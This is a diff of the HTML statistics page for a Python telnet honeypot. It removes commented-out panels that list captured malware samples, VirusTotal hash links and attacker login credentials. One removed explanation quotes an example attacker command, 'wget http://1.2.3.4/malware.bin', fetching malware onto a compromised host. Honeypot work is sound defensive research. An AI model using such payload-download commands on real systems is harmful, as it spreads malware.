@@ -138,40 +138,6 @@ angular.module('stats', ["chart.js"])
 <div class="container">
 	<h1>Python telnet honeypot statistics</h1>
 	<p><a href="/">Back to index</a>Visit us at <code>telnet://nack.duckdns.org</code></p>
-	<div class="row">
-	
-		<!--
-		<div class="col-md-6 col-xs-12" ng-controller="basicController">
-			<h3>Basic Statistics</h3>
-			<p>
-				Samples and urls are collected when an URL is provided in
-				the telnet Session by typing something like
-				<code>wget http://1.2.3.4/malware.bin</code>. The file
-				will be downloaded if the URL is not already known and
-				hashed, so that duplicates can be identified. All files
-				are also uploaded to <a href="https://virustotal.com" target="_blank">virustotal.com</a>.
-			</p>
-			<table class="table">
-				<tr><td>Total Connections:</td><td>{{ conns }}</td></tr>
-				<tr><td>Total Urls:</td><td>{{ urls }}</td></tr>
-				<tr><td>Total Samples:</td><td>{{ samples }}</td></tr>
-			</table>
-		</div>
-		-->
-		
-		<!--
-		<div class="col-md-6 col-xs-12" ng-controller="histController">
-			<h3>Connection history per hour</h3>
-			<canvas id="doughnut" class="chart chart-line" chart-data="data" chart-labels="labels" chart-series="series"></canvas> 
-			<p>
-				Succesful connections to the telnet server. A successful
-				connection is defined by logging in with username and password.
-				No further execution of commands is needed.
-			</p>
-		</div>
-		-->
-		
-	</div>
 
 	<div class="row" ng-controller="histController2">
 		<div class="col-md-12 col-xs-12">
@@ -193,88 +159,6 @@ angular.module('stats', ["chart.js"])
 				</tr>
 			</table>
 		</div>
-	</div>
-
-	<!--
-	<div class="row" ng-controller="statController">
-		<div class="col-md-12 col-xs-12">
-			<h3>Sample distribution by connection count</h3>
-			<p>
-				Counting every connection which tried to download a sample.
-				Connections downloading multiple samples will be counted
-				multiple times. Also may not display the malware distribution
-				by sample correctly, because many connections will actually download
-				nothing because they cannot provide a binary with matching
-				processor architecture.
-			</p>
-		</div>
-		<div class="col-md-4 col-xs-12">
-			<canvas id="doughnut" class="chart chart-doughnut" chart-data="data" chart-labels="labels" chart-colors="colors">
-			</canvas> 
-		</div>
-		<div class="col-md-8 col-xs-12">
-			<table class="table table-condensed" style="font-size: 10pt;">
-				<tr><th>Count</th><th>Name</th><th>AV Result</th><th>SHA256</th><th class="hidden-xs">Size</th><th>Last seen</th></tr>
-				<tr ng-repeat="s in samples">
-					<td>{{ s.count }}</td>
-					<td>{{ s.name }}</td>
-					<td>{{ s.result }}</td>
-					<td class="hidden-xs"><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256.substr(0,32) + "..." }}</a></td>
-					<td class="visible-xs"><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256.substr(0,6) + "..." }}</a></td>
-					<td class="hidden-xs">{{ s.length }}</td>
-					<td>{{ formatDate(s.lastseen) }}</td>
-				</tr>
-			</table>
-		</div>
-	</div>
-	-->
-	
-	
-	<div class="row" ng-controller="basicController">
-		<!--
-		<div class="col-md-7 col-xs-12">
-			<h3>Latest Samples</h3>
-			<table class="table table-condensed" style="font-size: 10pt;">
-				<tr><th>Time</th><th>Name</th><th>SHA256</th><th>Size</th></tr>
-				<tr ng-repeat="s in latestSamples">
-					<td class="visible-xs">{{ formatDate(s.date) }}</td>
-					<td class="hidden-xs">{{ formatDateSecs(s.date) }}</td>
-					<td>{{ s.name }}</td>
-					<td class="hidden-xs"><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256.substr(0,48) + "..." }}</a></td>
-					<td class="visible-xs"><a target="_blank" href="https://www.virustotal.com/latest-scan/{{s.sha256}}">{{ s.sha256.substr(0,6) + "..." }}</a></td>
-					<td>{{ s.length }}</td>
-				</tr>
-			</table>
-		</div>
-
-		<div class="col-md-5 col-xs-12">
-			<h3>Latest Connections</h3>
-			<table class="table table-condensed" style="font-size: 10pt;">
-				<tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
-				<tr ng-repeat="s in latestConns">
-					<td class="visible-xs">{{ formatDate(s.date) }}</td>
-					<td class="hidden-xs">{{ formatDateSecs(s.date) }}</td>
-					<td>{{ s.ip }}</td>
-					<td>{{ s.user }}</td>
-					<td>{{ s.pass }}</td>
-				</tr>
-			</table>
-		</div>
-		-->
-		
-		<!--
-		<div class="col-md-5 col-xs-12">
-			<h3>Latest URLS</h3>
-			<table class="table table-condensed" style="font-size: 10pt;">
-				<tr><th>Date</th><th>URL</th></tr>
-				<tr ng-repeat="s in latestUrls">
-					<td>{{ formatDate(s.date) }}</td>
-					<td>{{ s.url }}</td>
-				</tr>
-			</table>
-		</div>
-		-->
-
 	</div>
 </div>
 
